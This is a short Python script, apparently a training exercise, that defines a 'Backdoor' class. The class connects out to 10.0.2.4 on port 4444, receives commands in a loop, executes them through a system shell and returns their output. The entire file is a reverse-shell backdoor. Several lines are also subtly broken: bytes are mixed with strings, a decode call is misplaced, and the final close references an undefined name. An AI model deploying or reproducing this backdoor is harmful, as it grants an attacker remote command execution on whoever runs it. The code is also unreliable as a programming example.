import socket
import subprocess
import json

# my python path C:\"Program Files"\Python312\python.exe


class Backdoor:
    def __init__(self, host, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((host, port))
    
    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_recieve(self):
        json_data = ""
        while True :
            try :
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True)

    def run(self):
        while True:
            command = self.reliable_recieve().decode()  # Decode the received bytes to a string
            command_result = self.execute_system_command(command)
            self.reliable_send(command_result)  
        connection.close()


my_backdoor = Backdoor("10.0.2.4", 4444)
my_backdoor.run()
